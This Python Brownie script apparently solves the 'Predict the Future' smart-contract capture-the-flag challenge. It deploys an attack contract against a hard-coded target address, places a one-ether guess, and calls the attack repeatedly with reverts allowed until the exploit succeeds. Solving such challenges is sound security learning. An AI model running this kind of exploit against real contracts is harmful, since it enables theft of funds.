from scripts.helpful_scripts import get_account, ONE
from brownie import AttackPredictTheFuture, network
import time


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    print(f"account address: {account}")

    contract_address = "0xC3cfcB2E04Ff1bb21a979f1236b0641a98863BE9"

    attack_contract = AttackPredictTheFuture.deploy(contract_address, {"from": account})
    attack_contract.guess({"from": account, "value": ONE})

    # run until the tx doesn't revert
    attack_contract.attack(
        {
            "from": account,
            "gas_limit": 1000000,
            "allow_revert": True,
        }
    )
